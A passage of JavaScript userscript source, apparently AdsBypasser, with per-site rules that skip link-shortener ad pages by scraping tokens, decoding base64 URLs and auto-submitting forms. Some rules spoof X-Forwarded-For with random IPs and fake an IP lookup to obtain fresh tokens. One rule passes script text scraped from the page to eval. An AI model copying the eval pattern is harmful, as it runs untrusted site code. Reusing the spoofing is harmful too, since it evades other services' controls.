    /^(([\w]{8}|www)\.)?hornywood\.tv$/,
    /^(([\w]{8}|www)\.)?link(babes|bucks)\.com$/,
    /^(([\w]{8}|www)\.)?(megaline|miniurls|qqc|rqq|tinylinks|yyv|zff)\.co$/,
    /^(([\w]{8}|www)\.)?(these(blog|forum)s)\.com$/,
    /^(([\w]{8}|www)\.)?youfap\.me$/,
    /^warning-this-linkcode-will-cease-working-soon\.www\.linkbucksdns\.com$/,
  ];
  (function () {
    'use strict';
    function findToken (context) {
      var script = $.searchScripts('    var f = window[\'init\' + \'Lb\' + \'js\' + \'\']', context);
      if (!script) {
        _.warn('pattern changed');
        return null;
      }
      var adurl = script.match(/AdUrl\s*:\s*'([^']+)'/);
      if (!adurl) {
        return null;
      }
      adurl = adurl[1];
      var m1 = script.match(/AdPopUrl\s*:\s*'.+\?[^=]+=([\w\d]+)'/);
      var m2 = script.match(/Token\s*:\s*'([\w\d]+)'/);
      var token = m1[1] || m2[1];
      var m = script.match(/=\s*(\d+);/);
      var ak = parseInt(m[1], 10);
      var re = /\+\s*(\d+);/g;
      var tmp = null;
      while((m = re.exec(script)) !== null) {
        tmp = m[1];
      }
      ak += parseInt(tmp, 10);
      return {
        t: token,
        aK: ak,
        adurl: adurl,
      };
    }
    function sendRequest (token) {
      $.get(token.adurl);
      delete token.adurl;
      token.a_b = false;
      _.info('waiting the interval');
      return _.wait(5000).then(function () {
        _.info('sending token: %o', token);
        return $.get('/intermission/loadTargetUrl', token, {
          'X-Requested-With': _.none,
          Origin: _.none,
        });
      }).then(function (text) {
        var data = _.parseJSON(text);
        _.info('response: %o', data);
        if (!data.Success && data.Errors[0] === 'Invalid token') {
          _.warn('got invalid token');
          return retry();
        }
        if (data.AdBlockSpotted) {
          _.warn('adblock spotted');
          return;
        }
        if (data.Success && !data.AdBlockSpotted && data.Url) {
          return data.Url;
        }
      });
    }
    function retry () {
      return $.get(window.location.toString(), {}, {
        'X-Forwarded-For': $.generateRandomIP(),
      }).then(function (text) {
        var d = $.toDOM(text);
        var t = findToken(d);
        if (!t) {
          return _.wait(1000).then(retry);
        }
        return sendRequest(t);
      });
    }
    $.register({
      rule: {
        host: hostRules,
        path: /^\/\w+\/url\/(.+)$/,
      },
      ready: function(m) {
        $.removeAllTimer();
        $.resetCookies();
        $.removeNodes('iframe');
        var url = m.path[1] + window.location.search;
        var match = $.searchScripts(/UrlEncoded: ([^,]+)/);
        if (match && match[1] === 'true') {
          url = Encode(ConvertFromHex(url));
        }
        $.openLink(url);
      }
    });
    $.register({
      rule: {
        host: hostRules,
      },
      start: function () {
        $.window.XMLHttpRequest = _.nop;
      },
      ready: function () {
        $.removeAllTimer();
        $.resetCookies();
        $.removeNodes('iframe');
        if (window.location.pathname.indexOf('verify') >= 0) {
          var path = window.location.pathname.replace('/verify', '');
          $.openLink(path);
          return;
        }
        var token = findToken(document);
        sendRequest(token).then(function (url) {
          $.nuke(url);
          $.openLink(url);
        });
      },
    });
    $.register({
      rule: {
        query: /^(.*)[?&]_lbGate=\d+$/,
      },
      start: function (m) {
        $.setCookie('_lbGatePassed', 'true');
        $.openLink(window.location.pathname + m.query[1]);
      },
    });
  })();
})();
$.register({
  rule: {
    host: [
      /^www\.linkdecode\.com$/,
      /^www\.fastdecode\.com$/,
    ],
    path: /^\/$/,
    query: /^\?(.+)$/,
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var lnk = m.query[1];
    if (m.query[1].match(/^https?:\/\//)) {
    	$.openLink(lnk);
    	return;
    }
    var b = $.$('#popup');
    if (b && b.href) {
      $.openLink(b.href);
      return;
    }
    b = $('#m > .Visit_Link');
    b = b.onclick.toString().match(/window\.open\(\'([^']+)\'/);
    if (!b) {
      throw new _.AdsBypasser('pattern changed');
    }
    lnk = b[1].match(/\?(https?:\/\/.*)$/);
    if (lnk) {
        $.openLink(lnk[1]);
        return;
    }
    $.openLink(b[1]);
  },
});
$.register({
  rule: {
    host: /^linkdolar\.xyz$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var s = $.searchScripts(/^\s*eval\((.+)\)\s*$/);
    if (!s) {
      _.warn('site changed');
      return;
    }
    s = eval('(' + s[1] + ')');
    s = s.match(/\$\.post\('([^']+)',(\{.+\}),function/);
    if (!s) {
      _.warn('site changed');
    }
    var url = s[1];
    var args = eval('(' + s[2] + ')');
    $.post(url, args).then(function (target) {
      $.openLink(target);
    });
  },
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: [
        /^(www\.)?linkdrop\.net$/,
        /^dmus\.in$/,
        /^ulshare\.net$/,
        /^adurl\.id$/,
        /^goolink\.me$/,
        /^earningurl\.com$/,
      ],
    },
    ready: function () {
      $.removeNodes('iframe');
      var f = getForm();
      if (!f) {
        return;
      }
      sendRequest(f);
    },
  });
  $.register({
    rule: {
      host: /^sflnk\.me$/,
    },
    ready: function () {
      $.removeNodes('iframe');
      var f = getForm();
      if (!f) {
        f = $('#link-view');
        f.submit();
        return;
      }
      sendRequest(f);
    },
  });
  function getForm () {
    var jQuery = $.window.$;
    var f = jQuery('form[action="/links/go"], form[action="/links/linkdropgo"]');
    if (f.length > 0) {
      return f;
    }
    return null;
  }
  function sendRequest (f) {
    var jQuery = $.window.$;
    jQuery.ajax({
      dataType: 'json',
      type: 'POST',
      url: f.attr('action'),
      data: f.serialize(),
      success: function (result, status, xhr) {
        if (result.url) {
          $.openLink(result.url);
        } else {
          _.warn(result.message);
        }
      },
      error: function (xhr, status, error) {
        _.warn(xhr, status, error);
      },
    });
  }
})();
$.register({
  rule: {
    host: /^linkpaid\.net$/,
    path: /^\/go\//,
  },
  ready: function () {
    'use strict';
    var f = $('#btn-main');
    f.click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?linkplugapp\.com$/,
  },
  ready: function () {
    'use strict'
    var a = $('#mc_embed_signup_scroll a')
    $.openLink(a.href)
  },
})
$.register({
  rule: {
    host: /^linksas\.us$/,
    path: /^(\/\w+)$/,
  },
  ready: function (m) {
    'use strict';
    _.try(1000, function () {
      var recaptcha = $('#g-recaptcha-response');
      if (!recaptcha) {
        return null;
      }
      if (!recaptcha.value) {
        return _.none;
      }
      return recaptcha.value;
    }).then(function (recaptcha) {
      var url = _.T('http://ipinfo.io/{0}/json')($.generateRandomIP());
      return $.get(url).then(function (ipinfo) {
        ipinfo = _.parseJSON(ipinfo);
        return {
          codeAds: 1,
          country: ipinfo.country,
          ipAddress: ipinfo.ip,
          recaptcha: recaptcha,
        };
      });
    }).then(function (payload) {
      var token = $.getCookie('XSRF-TOKEN');
      return $.post('/go' + m.path[1], payload, {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': token,
      });
    }).then(function (data) {
      data = _.parseJSON(data);
      $.openLink(data.message);
    }).catch(function (e) {
      _.warn(e);
    });
  },
});
$.register({
  rule: {
    host: /^linksas\.us$/,
    path: /^\/go\//,
  },
  ready: function () {
    'use strict';
    var a = $.$('#btnSubmit');
    if (!a) {
      return;
    }
    var url = a.href;
    var pattern = /https?:\/\//g;
    var lastURL = '';
    while (true) {
      var matched = pattern.exec(url);
      if (!matched) {
        break;
      }
      lastURL = matched + url.substring(pattern.lastIndex);
    }
    $.openLink(lastURL);
  },
});
$.register({
  rule: {
    host: /^linkshrink\.net$/,
    path: /^\/[a-zA-Z0-9]+$/,
  },
  start: function () {
    'use strict';
    $.window._impspcabe = 0;
  },
  ready: function () {
    'use strict';
    var l = $.searchScripts(/revC\("([^"]+)"\)/);
    l = atob(l[1]);
    $.openLink('/' + l);
  },
});
$.register({
  rule: {
    host: /^linkshrink\.net$/,
    path: /=(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.path[1]);
  },
});
$.register({
  rule: 'http://lix.in/-*',
  ready: function () {
    'use strict';
    var i = $.$('#ibdc');
    if (i) {
      return;
    }
    i = $.$('form');
    if (i) {
      i.submit();
      return;
    }
    i = $('iframe');
    $.openLink(i.src);
  },
});
$.register({
  rule: {
    host: /^lnk\.in$/,
  },
  ready: function () {
    'use strict';
    var a = $('#divRedirectText a');
    $.openLink(a.innerHTML);
  },
});
$.register({
  rule: {
    host: /^(rd?)lnk\.co|reducelnk\.com$/,
    path: /^\/[^.]+$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('iframe#dest');
    if (f) {
      $.openLink(f.src);
      return;
    }
    $.removeNodes('iframe');
    var o = $.$('#urlholder');
    if (o) {
      $.openLink(o.value);
      return;
    }
    o = $.$('#skipBtn');
    if (o) {
      o = o.querySelector('a');
      $.openLink(o.href);
      return;
    }
    o = document.title.replace(/(LNK.co|Linkbee)\s*:\s*/, '');
    $.openLink(o);
  },
});
$.register({
  rule: {
    host: [
      /^lnx\.lu$/,
      /^url\.fm$/,
      /^z\.gs$/,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('#clickbtn a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^www\.lolinez\.com$/,
    query: /\?(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?loook\.ga$/,
    path: /^\/\d+$/
  },
  ready: function (m) {
    'use strict';
    var a = $('#download_link > a.btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^looy\.in$/,
    path: /^\/Pro\/(.+)$/,
  },
  ready: function (m) {
    'use strict';
    $.post('http://looy.in/Go/Index/ProSkipAd', {
      code: m.path[1],
      server: '',
    }).then(function (url) {
      $.openLink(url);
    }).catch(function (e) {
      _.warn(e);
    });
  },
});
$.register({
  rule: {
    host: /^looy\.in$/,
    path: /^\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/Pro/' + m.path[1]);
  },
});
$.register({
  rule: [
    'http://madlink.sk/',
    'http://madlink.sk/*.html',
  ],
});
$.register({
  rule: 'http://madlink.sk/*',
  start: function (m) {
    'use strict';
    $.removeNodes('iframe');
    $.post('/ajax/check_redirect.php', {
      link: m[1],
    }).then(function (text) {
      $.openLink(text);
    });
  },
});
$.register({
  rule: {
    host: [
      /^mant[ae][pb]\.in$/,
      /^st\.oploverz\.net$/,
      /^minidroid\.net$/,
      /^ww3\.awaremmxv\.com$/,
      /^linkpoi\.in$/,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('a.redirect, a[target=_blank][rel=nofollow]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^susutin\.com$/,
  },
  ready: function () {
    'use strict';
    var s = $.searchScripts(/="([^"]+)",/);
    $.openLink(s[1]);
  },
});
$.register({
  rule: {
    host: /^www\.mije\.net$/,
    path: /^\/\w+\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^mirrorfilehost\.com$/,
  },
  ready: function () {
    'use strict';
    _.wait(3 * 1000).then(function () {
      var frame = frames[0];
      var form = frame.document.createElement('form');
      form.target = '_parent';
      form.action = location.toString();
      var input = frame.document.createElement('input');
      input.value = 'Download';
      input.type = 'submit';
      form.appendChild(input);
      frame.document.body.appendChild(form);
      input.click();
    });
  },
});
$.register({
  rule: {
    host: [
      /^moe\.god\.jp$/,
      /^moesubs\.akurapopo\.pro$/,
      /^dl\.nsfk\.in$/,
    ]
  },
  ready: function () {
    'use strict';
    var a = $('div div center a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^moesubs\.com$/,
    path: /^\/url\//,
  },
  ready: function () {
    'use strict';
    var a = $('body > div:nth-child(4) > i:nth-child(1)');
    a = a.textContent;
    var i = a.lastIndexOf('http');
    a = a.substr(i);
    $.openLink(a);
  },
});
$.register({
  rule: {
    host: /^mt0\.org$/,
    path: /^\/[^\/]+\/$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('frame[name=bottom]');
    var f = $('frame[name=top]');
    var i = setInterval(function () {
      var a = $.$('div a', f.contentDocument);
      if (!a) {
        return;
      }
      clearInterval(i);
      $.openLink(a.href)
    }, 1000);
  },
});
$.register({
  rule: 'http://my-link.pro/*',
  ready: function () {
    'use strict';
    var i = $('iframe[scrolling=auto]');
    if (i) {
      $.openLink(i.src);
    }
  },
});
$.register({
  rule: {
    host: /^nmac\.to$/,
    path: /^\/download\/(.+)/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^nsfw\.in$/,
  },
  ready: function () {
    'use strict';
    var a = $('#long_url a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^nutshellurl\.com$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('iframe');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?ohleech\.com$/,
    path: /^\/dl\/$/,
  },
  ready: function () {
    'use strict';
    $.window.startdl();
  },
});
$.register({
  rule: {
    host: /^www\.oni\.vn$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var data = $.searchScripts(/data:"([^"]+)"/);
    if (!data) {
      throw new _.AdsBypasserError('pattern changed');
    }
    data = data[1];
    $.get('/click.html', data).then(function (url) {
      $.openLink(url);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?ouo\.(io|press)$/,
    path: /^\/go\/\w+$/,
  },
  ready: function (m) {
    'use strict';
    $('form').submit();
  },
});
$.register({
  rule: {
    host: /^oxyl\.me$/,
  },
  ready: function () {
    'use strict';
    var l = $.$$('.links-container.result-form > a.result-a');
    if (l.size() > 1) {
      return;
    }
    $.openLink(l.at(0).href);
  },
});
$.register({
  rule: {
    host: /^p\.pw$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var m = $.searchScripts(/window\.location = "(.*)";/);
    m = m[1];
    $.openLink(m);
  },
});
$.register({
  rule: {
    host: /^pdi2\.net$/,
  },
  ready: function () {
    'use strict';
    var s = $.searchScripts(/top\.location = '([^']+)'/);
    s = s[1];
    $.openLink(s);
  },
});
$.register({
  rule: {
    host: /^(www\.)?\w+\.rapeit\.net$/,
    path: /^\/(go|prepair|request|collect|analyze)\/[a-f0-9]+$/,
  },
  ready: function (m) {
    'use strict';
    var a = $('a#download_link');
    $.openLink(a.href);
  },
});
$.register({
  rule: 'http://reffbux.com/refflinx/view/*',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var m = $.searchScripts(/skip_this_ad_(\d+)_(\d+)/);
    var id = m[1];
    var share = m[2];
    var location = window.location.toString();
    $.post('http://reffbux.com/refflinx/register', {
      id: id,
      share: share,
      fp: 0,
      location: location,
      referer: '',
    }).then(function (text) {
      var m = text.match(/'([^']+)'/);
      if (!m) {
        throw new _.AdsBypasserError('pattern changed');
      }
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: 'http://richlink.com/app/webscr?cmd=_click&key=*',
  ready: function () {
    'use strict';
    var f = $('frameset');
    f = f.onload.toString();
    f = f.match(/url=([^&]+)/);
    if (f) {
      f = decodeURIComponent(f[1]);
    } else {
      f = $('frame[name=site]');
      f = f.src;
    }
    $.openLink(f);
  },
});
$.register({
  rule: 'http://rijaliti.info/*.php',
  ready: function () {
    'use strict';
    var a = $('#main td[align="center"] a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^riurl\.com$/,
    path: /^\/.+/,
  },
  ready: function () {
    'use strict';
    var s = $.$('body script');
    if (s) {
      s = s.innerHTML.indexOf('window.location.replace');
      if (s >= 0) {
        return;
      }
    }
    $.openLink('', {
      path: {
        hidden: '1',
        image: ' ',
      },
    });
  },
});
$.register({
  rule: {
    host: /^preview\.rlu\.ru$/,
  },
  ready: function () {
    'use strict';
    var a = $('#content > .long_url > a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^robo\.us$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var url = atob($.window.fl);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^www\.ron\.vn$/,
  },
  ready: function () {
    'use strict';
    var script = $.searchScripts('linknexttop');
    var data = script.match(/data:"([^"]+)"/);
    var url = $.window.domain + 'click.html?' + data[1];
    $.get(url, {}, {
      'Content-Type': 'application/json; charset=utf-8',
    }).then(function (url) {
      $.openLink(url);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?sa\.ae$/,
    path: /^\/\w+\/$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var real_link = '([^']+)';/);
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?safeurl\.eu$/,
    path: /\/\w+/,
  },
  ready: function () {
    'use strict';
    var directUrl = $.searchScripts(/window\.open\("([^"]+)"\);/);
    if (!directUrl) {
      throw new _.AdsBypasserError('script content changed');
    }
    directUrl = directUrl[1];
    $.openLink(directUrl);
  },
});
$.register({
  rule: {
    host: [
      /^segmentnext\.com$/,
      /^(www\.)?videogamesblogger.com$/,
    ],
    path: /^\/interstitial\.html$/,
    query: /return_url=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(decodeURIComponent(m.query[1]));
  },
});
$.register({
  rule: {
    host: /^(www\.)?(apploadz\.ru|seomafia\.net)$/
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var a = $('table a');
    $.openLink(a.href);
  },
});
$.register({
  rule: /http:\/\/setlinks\.us\/(p|t|d).*/,
  ready: function () {
    'use strict';
    var k = $.searchScripts(/window\.location='([^']+)'/);
    if (k) {
      $.openLink(k[1]);
      return;
    }
    var aLinks = $.$$('div.links-container.result-form:not(.p-links-container) > span.dlinks > a');
    if (aLinks.size() === 1) {
      $.openLink(aLinks.at(0).href);
      return;
    }
    k = $('img[alt=captcha]');
    $.captcha(k.src, function (a) {
      var b = $('#captcha');
      var c = $('input[name=Submit]');
      b.value = a;
      c.click();
    });
  },
});
(function () {
  'use strict';
  function afterGotSessionId (sessionId) {
    var X_NewRelic_ID = $.searchScripts(/xpid:"([^"]+)"/);
    var data = {
      adSessionId: sessionId,
    };
    var header = {
      Accept: 'application/json, text/javascript',
    };
    if (X_NewRelic_ID) {
      header['X-NewRelic-ID'] = X_NewRelic_ID;
    }
    var i = setInterval(function () {
      $.get('/shortest-url/end-adsession', data, header).then(function (text) {
        var r = _.parseJSON(text);
        if (r.status == "ok" && r.destinationUrl) {
          clearInterval(i);
          $.removeAllTimer();
          var url = decodeURIComponent(r.destinationUrl);
          $.openLink(url);
        }
      });
    }, 1000);
  }
  var hostRules = [
    /^sh\.st$/,
    /^(dh10thbvu|u2ks|jnw0|qaafa|xiw34|cllkme|clkmein|corneey|ceesty)\.com$/,
    /^[dfg]estyy\.com$/,
    /^digg\.to$/,
    /^([vw]iid|clkme)\.me$/,
    /^short\.est$/,
  ];
  $.register({
    rule: {
      host: hostRules,
      path: /^\/freeze\/.+/,
    },
    ready: function () {
      var o = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          if (mutation.target.getAttribute('class').match(/active/)) {
            o.disconnect();
            $.openLink(mutation.target.href);
          }
        });
      });
      o.observe($('#skip_button'), {
        attributes: true,
        attributeFilter: ['class'],
      });
    },
  });
  $.register({
    rule: {
      host: hostRules,
      path: /https?:\/\//,
    },
    start: function () {
      var url = window.location.pathname + window.location.search + window.location.hash;
      url = url.match(/(https?:\/\/.*)$/);
      url = url[1];
      $.openLink(url);
    },
  });
  $.register({
    rule: {
      host: hostRules,
      path: /^\/[\d\w]+/,
    },
    start: function () {
      $.window._impspcabe = 0;
    },
    ready: function () {
      $.removeNodes('iframe');
      $.removeAllTimer();
      var m = $.searchScripts(/sessionId: "([\d\w]+)",/);
      if (m) {
        afterGotSessionId(m[1]);
        return;
      }
      var o = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          var m = $.searchScripts(/sessionId: "([\d\w]+)",/);
          if (m) {
            o.disconnect();
            afterGotSessionId(m[1]);
          }
        });
      });
      o.observe(document.body, {
        childList: true,
      });
    },
  });
})();
$.register({
  rule: {
    host: [
      /^(www\.)?shink\.in$/,
      /^fas\.li$/,
      /^(www\.)?croco\.(me|site)$/,
      /^cpmlink\.net$/,
    ],
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('#skip');
    if (!$.$('#captcha')) {
      f.submit();
      return;
    }
    var o = new MutationObserver(function (mutations) {
      mutations.forEach(function (mutation) {
        mutation.addedNodes.forEach(function (node) {
          if (node.localName === 'div') {
            if (node.style.zIndex === '2147483647') {
              node.parentNode.removeChild(node);
              return;
            }
          }
        });
      });
    });
    o.observe(document.body, {
      childList: true,
      subtree: true,
    });
  },
});
$.register({
  rule: [
    {
      host: [
        /^fas\.li$/,
        /^cpmlink\.net$/,
      ],
      path: /^\/go\/\w+$/,
    },
    {
      host: /^(www\.)?croco\.(me|site)$/,
      path: /^\/ok\/\w+$/,
    },
  ],
  ready: function () {
    'use strict';
    var a = $('#btn-main');
    var i = a.href.lastIndexOf('http');
    a = a.href.substr(i);
    $.openLink(a);
  },
});
$.register({
  rule: {
    host: /^(www\.)?shink\.in$/,
    path: /^\/go\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('#skip');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^short\.am$/,
  },
  ready: function () {
    'use strict';
    _.wait(5000).then(function () {
      $.openLink('', {
        post: {
          image: 'Continue',
        },
      });
    });
  },
});
$.register({
  rule: {
    host: [
      /^(www\.)?shortenurl\.tk$/,
      /^(www\.)?pengaman\.link$/,
      /^urlgo\.gs$/,
      /^gunting\.web\.id$/,
    ],
    path: /^\/\w+$/,
  },
  ready: function (m) {
    'use strict';
    var l = $('a.btn-block.redirect');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?shorti\.ga$/,
    path: [
      /^\/\w+$/,
      /^\/url_redirector\.html$/,
    ],
  },
  ready: function () {
    'use strict';
    var f = $.$$('frame');
    var fl = f.find(function(value, key, self) {
      if (value.getAttribute('class')) {
        return _.none;
      }
      return 'Target frame found';
    });
    $.openLink(fl.value.src);
  },
});
$.register({
  rule: {
    host: /^www\.shortskip\.com$/,
    path: /^\/short\.php$/,
    query: /i=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    var url = decodeURIComponent(m.query[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^get\.shrink-service\.it$/,
    path: /^\/(.+)/,
  },
  start: function (m) {
    'use strict';
    var url = _.T('//www.shrink-service.it/shrinked/{0}');
    $.openLink(url(m.path[1]));
  },
});
$.register({
  rule: {
    host: /^www\.shrink-service\.it$/,
    path: /^\/shrinked\//,
  },
  ready: function () {
    'use strict';
    var i = $('input[id][name]');
    $.openLink(i.value);
  },
});
$.register({
  rule: {
    host: /^www\.shrink-service\.it$/,
    path: /^\/[se]\//,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var i = $('body > input[id][name]');
    $.openLink(i.value);
  },
});
$.register({
  rule: {
    host: /^sht\.io$/,
    path: /^\/\d+\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    url = url.match(/\{sht-io\}(.+)\{sht-io\}.*\{sht-io\}/);
    $.openLink(url[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?similarsites\.com$/,
    path: /^\/goto\/([^?]+)/
  },
  start: function (m) {
    'use strict';
    var l = m.path[1];
    if (!/^https?:\/\//.test(l)) {
      l = 'http://' + l;
    }
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^smll\.io$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/window\.location="([^"]*)";/);
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^www\.spaste\.com$/,
    path: /^\/go\/\w+$/,
  },
  ready: function () {
    'use strict';
    var id = $.searchScripts(/\{id:'(\d+)'\}/);
    _.wait(3000).then(function () {
      return $.post('/site/getRedirectLink', {
        id: id,
      }).then(function (url) {
        $.openLink(url);
      });
    });
  },
});
$.register({
  rule: {
    host: /^srnk\.co$/,
    path: /^\/i\//,
  },
  ready: function () {
    'use strict';
    var a = $.$('#btn-with-link');
    if (!a) {
      return;
    }
    var href = a.href;
    var method = a.dataset.method;
    if (method) {
      var csrfParam = $('meta[name="csrf-param"]').content;
      var csrfToken = $('meta[name="csrf-token"]').content;
      var form = document.createElement('form');
      form.method = 'post';
      form.action = href;
      var input = document.createElement('input');
      input.name = '_method';
      input.value = method;
      form.appendChild(input);
      input = document.createElement('input');
      input.name = csrfParam;
      input.value = csrfToken;
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
      return;
    }
    $.post(location.pathname + '.js').then(function (script) {
      var m = script.match(/var link = "([^"]+)";/);
      if (!m) {
        _.warn('script changed');
        return;
      }
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: {
    host: /^stash-coins\.com$/,
  },
  start: function () {
    'use strict';
    var url = window.location.toString();
    var i = url.lastIndexOf('http');
    url = url.substr(i);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^streamingfrench\.net$/,
    path: /^\/$/,
    query: /^\?xb=(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = decodeURIComponent(m.query[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^(www\.)?supercheats\.com$/,
    path: /^\/interstitial\.html$/,
    query: /(?:\?|&)oldurl=([^&]+)(?:$|&)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: [
    {
      host: [
        /^(www\.)?sylnk\.net$/,
        /^dlneko\.(com|net|org)$/,
        /^rumahsimpel\.com$/,
      ],
      query: /link=([^&]+)/,
    },
    {
      host: /^(www\.)?compul\.in$/,
      path: /^\/[np]\.php$/,
      query: /v=([^&]+)/,
    },
    {
      host: /^(www\.)?safelinkair\.com$/,
      path: /^\/code$/,
      query: /(?:\?|&)link=([a-zA-Z0-9\/=]+)(?:$|&)/,
    },
    {
      host: [
        /^link\.filmku\.net$/,
        /^www\.healthygress24\.ga$/,
        /^kombatch\.amankan\.link$/,
      ],
      path: /^\/p\/(go|healty-lie)\.html$/,
      query: /^\?url=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: [
        /^(gadget|auto|sports)14\.pw$/,
        /^motosport\.pw$/,
        /^nar-04\.tk$/,
        /^lindung\.in$/,
        /^motonews\.club$/,
        /^ww[23]\.picnictrans\.com$/,
        /^gadget13\.com$/,
        /^azhie\.net$/,
        /^ww2\.awsubs\.co$/,
        /^autorp\.us$/
      ],
      query: /^\?d=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: /^www\.anisubsia\.tk$/,
      path: /^\/p\/link\.html$/,
      query: /^\?url=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: [
        /^www\.insurance1\.tech$/,
        /^www\.freeanimeonline\.xyz$/,
      ],
      query: /^\?site=([a-zA-Z0-9\/=]+)/,
    },
    {
      host: /^i\.gtaind\.com$/,
      query: /^\?([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: /\.blogspot\.com?/,
      query: [
        /^\?url=([a-zA-Z0-9\/=]+)$/,
        /^\?id=([a-zA-Z0-9\/=]+)$/,
      ],
    },
    {
      host: /^sehatlega\.com$/,
      query: /^\?lanjut=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: /^shorten\.id$/,
      query: /^\?url=([a-zA-Z0-9\/=]+)=$/,
    },
  ],
  start: function (m) {
    'use strict';
    var rawLink = atob(m.query[1]);
    $.openLink(rawLink);
  },
});
$.register({
  rule: [
    {
      host: [
        /(^|\.)safelinkconverter2?\.com$/,
        /^safelink(s?review(er)?)\.com?$/,
        /^susutin\.com$/,
        /^(getcomics|miuitutorial)\.gq$/,
        /^awsubs\.cf$/,
        /^awsubsco\.ga$/,
      ],
      query: /id=([\w\\]+=*)/,
    },
    {
      host: [
        /^(www\.)?dlneko\.com$/,
        /^(satuasia|tawaku)\.com$/,
        /^ww3\.manteb\.in$/,
        /^link\.filmku\.net$/,
        /^www\.muucih\.com$/,
        /^(naisho|filmku)\.lompat\.in$/,
        /^edogawa\.lon\.pw$/,
        /^telolet\.in$/,
      ],
      query: /go=([\w\\]+=*)/,
    },
  ],
  start: function (m) {
    'use strict';
    var l = atob(m.query[1]);
    var table = {
      '!': 'a',
      ')': 'e',
      '_': 'i',
      '(': 'o',
      '*': 'u',
    };
    l = l.replace(/[!)_(*]/g, function (m) {
      return table[m];
    });
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^(www\.)?safelinkreview\.com$/,
    path: /^\/\w+\/cost\/([\w\.]+)\/?$/,
  },
  start: function (m) {
    'use strict';
    var l = 'http://' + m.path[1];
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: [
      /^(designinghomey|ani-share|sinopsisfilmku)\.com$/,
      /^motonews\.club$/,
      /^(autofans|landscapenature)\.pw$/,
      /^(sidespace|erogedownload)\.net$/,
    ],
    query: /get=([^&]+)/,
  },
  ready: function (m) {
    'use strict';
    var s = $.searchScripts(/var a='([^']+)'/);
    if (s) {
      $.openLink(s[1]);
      return;
    }
    s = atob(m.query[1]);
    $.openLink(s);
  },
});
$.register({
  rule: {
    host: /^kombatch\.loncat\.pw$/,
  },
  ready: function () {
    'use strict';
    var s = $.searchScripts(/\.open\("([^"]+)",/);
    s = s[1].match(/go=([^&]+)/);
    s = atob(s[1]);
    $.openLink(s);
  },
});
$.register({
  rule: {
    host: [
      /^ww[23]\.picnictrans\.com$/,
      /^short\.awsubs\.(co|me)$/,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('div.kiri > center > a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^techfunda\.net$/,
    path: [
        /^\/link\//,
        /^\/safe\//,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('.hide a.btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
